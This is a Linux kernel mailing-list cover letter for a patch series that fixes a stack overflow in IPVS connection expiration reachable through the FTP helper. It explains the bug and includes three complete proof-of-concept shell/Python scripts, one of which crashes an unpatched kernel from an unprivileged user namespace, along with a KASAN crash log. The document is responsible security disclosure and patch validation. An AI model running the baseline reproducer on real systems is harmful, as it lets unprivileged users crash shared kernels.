Received: from mail-pl1-f179.google.com (mail-pl1-f179.google.com [209.85.214.179])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id DF6F64A1DFE
	for <lvs-devel@vger.kernel.org>; Fri, 25 Sep 2026 16:41:04 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.179
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1790354479; cv=none; b=ApnXDdlnl+Xf3UP7GyU1Chim2W0RQ7XyDp31eT8X+ZOY4AvcQoV2mkCvptj6apYRa4rf7zyMYjqmjXn5Na5OALnx4GG40QrkxW20ZEX9I1oxn1gp82rSeCnqCDrw0U+aW1Fkecui5a5LHX44+H2lNkLMu2uqc2xW6RX9WMV0tVY=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1790354479; c=relaxed/simple;
	bh=Ua0lTcddtKf06Brd7f09PrPtMl9dQzGUkuz8CNNdFno=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=c1O6RikQJd4/d49O03febgEPt5eCWxciCO8+gz04lNxhP9KRinjS5fr1hOwszl290X7fylBadfyPTz7mmBQjYTqpOSt+8ZLT93FIugAOQbv2McP8eirAbngF2kjxoG8nm/uuLrNuNpIgC8iksAX+cUqcNKGwAxesgb+7DCM7oQo=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=drpZiNbT; arc=none smtp.client-ip=209.85.214.179
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="drpZiNbT"
Received: by mail-pl1-f179.google.com with SMTP id d9443c01a7336-2caced6038eso6551985ad.0
        for <lvs-devel@vger.kernel.org>; Fri, 25 Sep 2026 09:41:03 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1790354461; x=1790959261; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=6K7cyZnQRLh/5DHd96ApHXpUZJQrTbS18ekG9d4KPLI=;
        b=drpZiNbTDkNkl7rr4rZyDOU6Wph61TAxlru3y5nVZTwWKmHQp4ydJUmojD202IXBmp
         zErhLrIHOHigMoGw5rAHlpHJ4NMH++dbflFuSc5RmYK/Fq1Vxhzpded+nXxCh+q04L8U
         BO7Q8TsObxk+7X3N1CmUnoI6FSmBQzXBCy70RDV0zhuG049QsPHgFHjAsqC113AaxTnq
         RlIXXMaVdZjNZO+AJLD+C2lKYzX3L/26BcZl0YpOJljLDWB8xGXHISV1ktwypY6p3usA
         Zbs7fI5rIPR1ixdHNZAwLEiGFSd/P9RELafef2h9O8ksfGJ+knSEcG7gsBtz9C6ILFEP
         qFtQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1790354461; x=1790959261;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=6K7cyZnQRLh/5DHd96ApHXpUZJQrTbS18ekG9d4KPLI=;
        b=vk4ne30zaXayRphk55DPrzGq3KKcx66u4l0i5kN8SS+fivMTcW3R0MNFrEPcSnpEtH
         7gRKamA68SdCwks38qRtjL/uY9SQ3tr8WE1lAN0AGnOMMGpao3QAS17saFZBEjUYekIp
         57HUnDxxuQiWVBNQSU2qqslJZdy1cEkxu4SjCb1mGmsJjfb/NNRi6I665zMH6unU/Ko6
         XhjDq5GzRLoccyj28ZtlNfW3P7Z3gWQwFGEloVWhMd2WgPWYzw3LenYpOIUArge9HlqD
         qYSYgs2aUt/XUqrCevr8PFnEvDt5/O/3Fs2j2g8GOZTiE1aRwKCcgvbYHR0YZCZBYJJr
         uG8g==
X-Forwarded-Encrypted: i=1; AKwUvBxBdMcm8Q0ffepTcXtNB7KHD1Nz4pPB1v/GAjQeWOjwRu3zDag61IgIX/4tIw2jM/fnn04tTCNU8ZY=@vger.kernel.org
X-Gm-Message-State: AFuF++lQHMwhIJuPYWqVickuGvs4e8qX1T3mJHju96IMcrq6pmk0lOdP
	UtkTV4K8vkWVhs3xrPJIvY3xeJguUASAGmhd7Dl6AYEitB+ni9JHSBGPaX9QfoDWWKo3
X-Gm-Gg: AYBFou0jwB+49qPnXYHl11cEf3qhNNI1JL/+Nwel+1cB/pOl+HHFO5+BzBKxNskusv7
	/gxyJl37NIwLx3Mh9w85jfKHr03EyUPvSm3jqAaECfb34XGlpQomHfTH48wZhg1UZLZUG9CTVRI
	ol0srsSr0DTmieooeBBxOqT8bLww0kvflYFXLj6kQFhRudkq3GX7o5ow/ZFx8nG+aMNN/yMRiO7
	x7oEzGvANZmJeEDC8/MK+OcvvwPESa3ElrEbYwiKLHA1N8nmmKsRBrHwdXhGJs8buQA7irW5H7D
	+LKqkIgPtFiSdrtHCFd7s+V2rOD3/TGV7ON5flJNzbGU1JM5mgwuUaTlj4BFsJb6SkpTukgWH1v
	Q+UmvIFKoRVtoE2KMSyZUPBxyyBr+A9gjuiJRHbL+MX/td2W+m5btXlN4mb6eMJJzt69blDp5Qk
	MAAMK/7P8RTK4sxGqx7WEGl/e6qJ0N3XHNBZ4Zrb3PF2dO8qIruYJhOSyIFfXK8hoENnlOqenFY
	rfCKpQAavf2ZKbYfEXqxPgJcVm5hNz6Twkq5FVA
X-Received: by 2002:a17:902:d4d2:b0:2df:34c0:7301 with SMTP id d9443c01a7336-2df7e39fcdbmr35348845ad.38.1790354460894;
        Fri, 25 Sep 2026 09:41:00 -0700 (PDT)
Received: from 954df21a5119.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2df9146edb4sm13855275ad.81.2026.09.25.09.40.56
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 25 Sep 2026 09:41:00 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org,
	lvs-devel@vger.kernel.org,
	netfilter-devel@vger.kernel.org
Cc: horms@verge.net.au,
	ja@ssi.bg,
	pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	zihanx@nebusec.ai
Subject: [PATCH nf v5 0/3] ipvs: avoid stack overflow from recursive connection expiration
Date: Fri, 25 Sep 2026 16:40:45 +0000
Message-ID: <cover.1790266803.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: lvs-devel@vger.kernel.org
List-Id: <lvs-devel.vger.kernel.org>
List-Subscribe: <mailto:lvs-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:lvs-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in
net/netfilter/ipvs/ip_vs_ftp.c and net/netfilter/ipvs/ip_vs_conn.c. The
bug is reachable by a non-root user via a user namespace and a network
namespace.
We've tested it, and it should not affect any other functionality.

This series contains 3 patches:

  1/3 Fix the timer callback race during IPVS connection deletion.
  2/3 Replace recursive controller expiration with an iterative cleanup
      path.
  3/3 Reject zero and configured FTP control ports as data ports.

We will provide detailed information about the bug
in this email, along with PoCs to trigger it.

---- details below ----

Bug details:

The trigger entry point is ip_vs_ftp_out() in
net/netfilter/ipvs/ip_vs_ftp.c. It parses an EPSV reply from the real
server and creates a wildcard data connection from the advertised port.
The baseline PoC uses port 21, the default FTP control port.
ip_vs_conn_new() then binds the FTP helper to the new connection again.
Because the child has IP_VS_CONN_F_NO_CPORT, the next connection from the
same client to the VIP on port 21 matches the wildcard child instead of
creating a new top-level entry.
Repeating EPSV builds a controlled-connection chain.

The active-mode entry point, ip_vs_ftp_in(), has the same chain-building
condition when the derived data port is a configured control port. The
data connection's virtual port is derived from cp->vport - 1. With
ports={21,20}, the derived port is 20, so ip_vs_conn_new() can bind the
FTP helper again.

The FTP entry points are in ip_vs_ftp.c, but the stack-overflow root cause
is in the generic cleanup path in ip_vs_conn.c. When a controlled
connection expires, ip_vs_conn_expire() can delete and expire its
controller. The old path can then call ip_vs_conn_expire() recursively. A
long controlled-connection chain can exhaust the kernel stack. The
reproduced failure occurs during network namespace teardown, but the
cleanup bug is in the generic controller-chain path, not a teardown-only
special case.

Patch 1 prevents a connection from being unlinked while a concurrent timer
callback can still use it. It revalidates n_control and timer state after
excluding the connection from traffic, and gives a concurrent callback
another chance when deletion does not own the timer. The deletion and
controller-chain walk stay under RCU while the timer-callback race is
handled.

Patch 2 continues expiration with the controller after the current
connection has been fully cleaned up instead of recursively calling the
expiration path. The cleanup remains synchronous while using one stack
frame for the whole chain. The iteration also switches the controller to
deletion mode and preserves the timer-callback handling from patch 1.

Patch 3 rejects zero and configured FTP control ports before creating
passive data connections in ip_vs_ftp_out(), covering both PASV and EPSV.
It also rejects a zero active-mode client port and a data port
derived from a configured control port in ip_vs_ftp_in(). Valid data ports
continue through the existing path.

The recursive-cleanup root cause was introduced by
f9200a52eedf ("ipvs: avoid expiring many connections from timer"). The FTP
helper's acceptance of a configured control port is a separate root-cause
fact, introduced by 1da177e4c3f4 ("Linux-2.6.12-rc2"). These are different
root-cause facts, so the fixes use separate Fixes: tags.

Reproducer:

The reproducers are shell scripts with embedded Python. The baseline
reproducer was run as follows:

    SELF_UNSHARE=1 MODE=exit ./poc-original.sh 400

The fixed passive-mode run was:

    SELF_UNSHARE=1 MODE=exit ./poc.sh 200

The active-mode run used this complete kernel command line:

    root=/dev/sda rw console=ttyS0 earlyprintk=serial net.ifnames=0 biosdevname=0 nokaslr panic_on_warn=0 oops=panic systemd.mask=sys-kernel-config.mount systemd.mask=systemd-remount-fs.service systemd.unit=multi-user.target ip_vs_ftp.ports=21,20

and this command:

    SELF_UNSHARE=1 MODE=exit ./poc-active.sh 1

The active-mode validation used depth 1 to check the configured-port
guard; it was not used as a deeper chain stress test.

packetdrill was not used because the trigger requires namespace creation,
the legacy IPVS sockopt ABI, a cooperating TCP server, and namespace
teardown. packetdrill cannot express that complete control-plane setup and
lifetime on its own.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

The baseline was built from 70194dc37670
(7.3.0-rc2-g70194dc37670). The baseline PoC exited with status 0 and
reported 401 IPVS entries after building 400 controlled connections. The
baseline namespace teardown produced the decoded KASAN report below.

The passive PoC ran on the v4 kernel and exited with status 0,
reporting:

    built 200 connections
    rejected control-port replies: 200/200
    ip_vs_conn entries before trigger: 200
    passive data connections created: 0
    exiting namespace holder

The active-mode validation also ran on the v4 kernel and exited with
status 0, reporting:

    built 1 connections
    ip_vs_conn entries before trigger: 1
    derived data connections created: 0
    exiting namespace holder

The fixed passive and active runs produced no KASAN, BUG, Oops, kernel
panic, stack-guard, or general-protection diagnostics. The baseline run
produced the crash during namespace teardown. The crash excerpt below is
copied from the decoded baseline report; unrelated boot output, registers,
and disassembly are omitted.

Reproducer source files:

------BEGIN poc-original.sh------
#!/bin/sh
set -eu

DEPTH="${1:-400}"
MODE="${MODE:-exit}"
SELF_UNSHARE="${SELF_UNSHARE:-0}"

if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
		unshare -Urn -- "$0" "${DEPTH}"
fi

ulimit -n 65535 2>/dev/null || true

IP=/usr/sbin/ip
PYTHON=/usr/bin/python3

VIP=198.51.100.1
REAL=198.51.100.2
CLIENT=198.51.100.3
PORT=21

"${IP}" link set lo up
"${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true

exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
import ctypes
import os
import socket
import sys
import threading
import time

depth = int(sys.argv[1])
mode = sys.argv[2]
vip = sys.argv[3]
real = sys.argv[4]
client_ip = sys.argv[5]
port = int(sys.argv[6])

ready = threading.Event()
server_error = []
client_error = []
accepted = []
clients = []

IP_VS_BASE_CTL = 64 + 1024 + 64
IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7


class Svc(ctypes.Structure):
    _fields_ = [
        ("protocol", ctypes.c_uint16),
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("fwmark", ctypes.c_uint32),
        ("sched_name", ctypes.c_char * 16),
        ("flags", ctypes.c_uint),
        ("timeout", ctypes.c_uint),
        ("netmask", ctypes.c_uint32),
    ]


class Dest(ctypes.Structure):
    _fields_ = [
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("conn_flags", ctypes.c_uint),
        ("weight", ctypes.c_int),
        ("u_threshold", ctypes.c_uint32),
        ("l_threshold", ctypes.c_uint32),
    ]


def native_u32(ip):
    return int.from_bytes(socket.inet_aton(ip), sys.byteorder)


def ipvs_sock():
    return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)


def ipvs_flush():
    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
    finally:
        s.close()


def ipvs_add_service():
    svc = Svc()
    svc.protocol = socket.IPPROTO_TCP
    svc.addr = native_u32(vip)
    svc.port = socket.htons(port)
    svc.fwmark = 0
    svc.sched_name = b"rr"
    svc.flags = 0
    svc.timeout = 0
    svc.netmask = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
    finally:
        s.close()
    return svc


def ipvs_add_dest(svc):
    dest = Dest()
    dest.addr = native_u32(real)
    dest.port = socket.htons(port)
    dest.conn_flags = 0
    dest.weight = 1
    dest.u_threshold = 0
    dest.l_threshold = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
    finally:
        s.close()


def recv_line(sock):
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise RuntimeError("unexpected EOF")
        data.extend(chunk)
    return bytes(data)


def server():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((real, port))
        srv.listen(depth + 16)
        ready.set()
        for i in range(depth):
            conn, addr = srv.accept()
            conn.sendall(b"220 ready\r\n")
            line = recv_line(conn)
            if b"EPSV" not in line.upper():
                raise RuntimeError(f"unexpected request on level {i}: {line!r}")
            conn.sendall(b"229 Entering Extended Passive Mode (|||21|)\r\n")
            accepted.append(conn)
        while True:
            time.sleep(1)
    except BaseException as exc:
        server_error.append(repr(exc))
        ready.set()


try:
    try:
        ipvs_flush()
    except OSError:
        pass
    service = ipvs_add_service()
    ipvs_add_dest(service)
except OSError as exc:
    raise SystemExit(f"ipvs setup failed: {exc}")


threading.Thread(target=server, daemon=True).start()
ready.wait()
if server_error:
    raise SystemExit(f"server failed early: {server_error[0]}")

for i in range(depth):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((client_ip, 0))
        s.connect((vip, port))
        banner = recv_line(s)
        if not banner.startswith(b"220 "):
            raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
        s.sendall(b"EPSV\r\n")
        reply = recv_line(s)
        if b"229 " not in reply:
            raise RuntimeError(f"unexpected EPSV reply on level {i}: {reply!r}")
        clients.append(s)
        if (i + 1) % 50 == 0 or i + 1 == depth:
            print(f"built {i + 1} connections", flush=True)
    except BaseException as exc:
        client_error.append(repr(exc))
        break

if client_error:
    raise SystemExit(f"client failed: {client_error[0]}")
if server_error:
    raise SystemExit(f"server failed: {server_error[0]}")

try:
    with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
        conn_lines = sum(1 for _ in f) - 1
except OSError:
    conn_lines = -1

print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)

if mode == "hold":
    while True:
        time.sleep(1)
elif mode == "flush":
    ipvs_flush()
    print("IPVS flush returned", flush=True)
    while True:
        time.sleep(1)
elif mode == "exit":
    print("exiting namespace holder", flush=True)
    sys.stdout.flush()
    os._exit(0)
else:
    raise SystemExit(f"unknown MODE={mode!r}")
PY
------END poc-original.sh--------

------BEGIN poc.sh------
#!/bin/sh
set -eu

DEPTH="${1:-400}"
MODE="${MODE:-exit}"
SELF_UNSHARE="${SELF_UNSHARE:-0}"

if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
		unshare -Urn -- "$0" "${DEPTH}"
fi

ulimit -n 65535 2>/dev/null || true

IP=/usr/sbin/ip
PYTHON=/usr/bin/python3

VIP=198.51.100.1
REAL=198.51.100.2
CLIENT=198.51.100.3
PORT=21

"${IP}" link set lo up
"${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true

exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
import ctypes
import os
import socket
import sys
import threading
import time

depth = int(sys.argv[1])
mode = sys.argv[2]
vip = sys.argv[3]
real = sys.argv[4]
client_ip = sys.argv[5]
port = int(sys.argv[6])

ready = threading.Event()
server_error = []
client_error = []
accepted = []
clients = []
rejected = 0

IP_VS_BASE_CTL = 64 + 1024 + 64
IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7


class Svc(ctypes.Structure):
    _fields_ = [
        ("protocol", ctypes.c_uint16),
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("fwmark", ctypes.c_uint32),
        ("sched_name", ctypes.c_char * 16),
        ("flags", ctypes.c_uint),
        ("timeout", ctypes.c_uint),
        ("netmask", ctypes.c_uint32),
    ]


class Dest(ctypes.Structure):
    _fields_ = [
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("conn_flags", ctypes.c_uint),
        ("weight", ctypes.c_int),
        ("u_threshold", ctypes.c_uint32),
        ("l_threshold", ctypes.c_uint32),
    ]


def native_u32(ip):
    return int.from_bytes(socket.inet_aton(ip), sys.byteorder)


def ipvs_sock():
    return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)


def ipvs_flush():
    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
    finally:
        s.close()


def ipvs_add_service():
    svc = Svc()
    svc.protocol = socket.IPPROTO_TCP
    svc.addr = native_u32(vip)
    svc.port = socket.htons(port)
    svc.fwmark = 0
    svc.sched_name = b"rr"
    svc.flags = 0
    svc.timeout = 0
    svc.netmask = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
    finally:
        s.close()
    return svc


def ipvs_add_dest(svc):
    dest = Dest()
    dest.addr = native_u32(real)
    dest.port = socket.htons(port)
    dest.conn_flags = 0
    dest.weight = 1
    dest.u_threshold = 0
    dest.l_threshold = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
    finally:
        s.close()


def recv_line(sock):
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise RuntimeError("unexpected EOF")
        data.extend(chunk)
    return bytes(data)


def server():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((real, port))
        srv.listen(depth + 16)
        ready.set()
        for i in range(depth):
            conn, addr = srv.accept()
            conn.sendall(b"220 ready\r\n")
            line = recv_line(conn)
            if b"EPSV" not in line.upper():
                raise RuntimeError(f"unexpected request on level {i}: {line!r}")
            conn.sendall(b"229 Entering Extended Passive Mode (|||21|)\r\n")
            accepted.append(conn)
        while True:
            time.sleep(1)
    except BaseException as exc:
        server_error.append(repr(exc))
        ready.set()


try:
    try:
        ipvs_flush()
    except OSError:
        pass
    service = ipvs_add_service()
    ipvs_add_dest(service)
except OSError as exc:
    raise SystemExit(f"ipvs setup failed: {exc}")


threading.Thread(target=server, daemon=True).start()
ready.wait()
if server_error:
    raise SystemExit(f"server failed early: {server_error[0]}")

for i in range(depth):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((client_ip, 0))
        s.connect((vip, port))
        banner = recv_line(s)
        if not banner.startswith(b"220 "):
            raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
        s.sendall(b"EPSV\r\n")
        s.settimeout(0.2)
        try:
            reply = recv_line(s)
        except socket.timeout:
            rejected += 1
            print(f"control-port reply rejected on level {i}", flush=True)
        else:
            raise RuntimeError(
                f"control-port reply was not rejected on level {i}: {reply!r}"
            )
        clients.append(s)
        if (i + 1) % 50 == 0 or i + 1 == depth:
            print(f"built {i + 1} connections", flush=True)
    except BaseException as exc:
        client_error.append(repr(exc))
        break

if client_error:
    raise SystemExit(f"client failed: {client_error[0]}")
if server_error:
    raise SystemExit(f"server failed: {server_error[0]}")
if rejected != depth:
    raise SystemExit(f"expected {depth} rejected replies, got {rejected}")

try:
    with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
        conn_lines = sum(1 for _ in f) - 1
except OSError:
    conn_lines = -1

print(f"rejected control-port replies: {rejected}/{depth}", flush=True)
print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)
if conn_lines != depth:
    raise SystemExit(
        f"expected {depth} IPVS entries, got {conn_lines}; "
        "a passive data connection was created"
    )
print(f"passive data connections created: {conn_lines - depth}", flush=True)

if mode == "hold":
    while True:
        time.sleep(1)
elif mode == "flush":
    ipvs_flush()
    print("IPVS flush returned", flush=True)
    while True:
        time.sleep(1)
elif mode == "exit":
    print("exiting namespace holder", flush=True)
    sys.stdout.flush()
    os._exit(0)
else:
    raise SystemExit(f"unknown MODE={mode!r}")
PY
------END poc.sh--------

------BEGIN poc-active.sh------
#!/bin/sh
set -eu

DEPTH="${1:-400}"
MODE="${MODE:-exit}"
SELF_UNSHARE="${SELF_UNSHARE:-0}"

if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
		unshare -Urn -- "$0" "${DEPTH}"
fi

ulimit -n 65535 2>/dev/null || true

IP=/usr/sbin/ip
PYTHON=/usr/bin/python3

VIP=198.51.100.1
REAL=198.51.100.2
CLIENT=198.51.100.3
PORT=21

"${IP}" link set lo up
"${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true

exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
import ctypes
import os
import socket
import sys
import threading
import time

depth = int(sys.argv[1])
mode = sys.argv[2]
vip = sys.argv[3]
real = sys.argv[4]
client_ip = sys.argv[5]
port = int(sys.argv[6])

ready = threading.Event()
server_error = []
client_error = []
accepted = []
clients = []

IP_VS_BASE_CTL = 64 + 1024 + 64
IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7


class Svc(ctypes.Structure):
    _fields_ = [
        ("protocol", ctypes.c_uint16),
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("fwmark", ctypes.c_uint32),
        ("sched_name", ctypes.c_char * 16),
        ("flags", ctypes.c_uint),
        ("timeout", ctypes.c_uint),
        ("netmask", ctypes.c_uint32),
    ]


class Dest(ctypes.Structure):
    _fields_ = [
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("conn_flags", ctypes.c_uint),
        ("weight", ctypes.c_int),
        ("u_threshold", ctypes.c_uint32),
        ("l_threshold", ctypes.c_uint32),
    ]


def native_u32(ip):
    return int.from_bytes(socket.inet_aton(ip), sys.byteorder)


def ipvs_sock():
    return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)


def ipvs_flush():
    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
    finally:
        s.close()


def ipvs_add_service():
    svc = Svc()
    svc.protocol = socket.IPPROTO_TCP
    svc.addr = native_u32(vip)
    svc.port = socket.htons(port)
    svc.fwmark = 0
    svc.sched_name = b"rr"
    svc.flags = 0
    svc.timeout = 0
    svc.netmask = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
    finally:
        s.close()
    return svc


def ipvs_add_dest(svc):
    dest = Dest()
    dest.addr = native_u32(real)
    dest.port = socket.htons(port)
    dest.conn_flags = 0
    dest.weight = 1
    dest.u_threshold = 0
    dest.l_threshold = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
    finally:
        s.close()


def recv_line(sock):
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise RuntimeError("unexpected EOF")
        data.extend(chunk)
    return bytes(data)


def server():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((real, port))
        srv.listen(depth + 16)
        ready.set()
        for i in range(depth):
            conn, addr = srv.accept()
            conn.sendall(b"220 ready\r\n")
            line = recv_line(conn)
            if not line.upper().startswith(b"PORT "):
                raise RuntimeError(f"unexpected request on level {i}: {line!r}")
            conn.sendall(b"200 PORT command successful\r\n")
            accepted.append(conn)
        while True:
            time.sleep(1)
    except BaseException as exc:
        server_error.append(repr(exc))
        ready.set()


try:
    try:
        ipvs_flush()
    except OSError:
        pass
    service = ipvs_add_service()
    ipvs_add_dest(service)
except OSError as exc:
    raise SystemExit(f"ipvs setup failed: {exc}")


threading.Thread(target=server, daemon=True).start()
ready.wait()
if server_error:
    raise SystemExit(f"server failed early: {server_error[0]}")

for i in range(depth):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((client_ip, 0))
        s.connect((vip, port))
        banner = recv_line(s)
        if not banner.startswith(b"220 "):
            raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
        s.sendall(b"PORT 198,51,100,3,4,1\r\n")
        time.sleep(0.2)
        clients.append(s)
        if (i + 1) % 50 == 0 or i + 1 == depth:
            print(f"built {i + 1} connections", flush=True)
    except BaseException as exc:
        client_error.append(repr(exc))
        break

if client_error:
    raise SystemExit(f"client failed: {client_error[0]}")
if server_error:
    raise SystemExit(f"server failed: {server_error[0]}")

try:
    with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
        conn_lines = sum(1 for _ in f) - 1
except OSError:
    conn_lines = -1

print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)
if conn_lines != depth:
    raise SystemExit(
        f"expected {depth} IPVS entries, got {conn_lines}; "
        "a derived data connection was created"
    )
print(f"derived data connections created: {conn_lines - depth}", flush=True)

if mode == "hold":
    while True:
        time.sleep(1)
elif mode == "flush":
    ipvs_flush()
    print("IPVS flush returned", flush=True)
    while True:
        time.sleep(1)
elif mode == "exit":
    print("exiting namespace holder", flush=True)
    sys.stdout.flush()
    os._exit(0)
else:
    raise SystemExit(f"unknown MODE={mode!r}")
PY
------END poc-active.sh--------

----BEGIN crash log----
[   40.621758] BUG: KASAN: stack-out-of-bounds in __unwind_start (arch/x86/kernel/unwind_orc.c:715)
[   40.621785] Write of size 112 at addr ff11000007307e98 by task kworker/u8:0/12
[   40.621785] 
[   40.621785] CPU: 1 UID: 0 PID: 12 Comm: kworker/u8:0 Not tainted 7.3.0-rc2-g70194dc37670 #1 PREEMPT(lazy) 
[   40.621785] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   40.621785] Workqueue: netns cleanup_net
[   40.621785] Call Trace:

[   40.951167] BUG: unable to handle page fault for address: ff11000011430ff4
[   40.951167] #PF: supervisor instruction fetch in kernel mode
[   40.951167] #PF: error_code(0x0011) - permissions violation
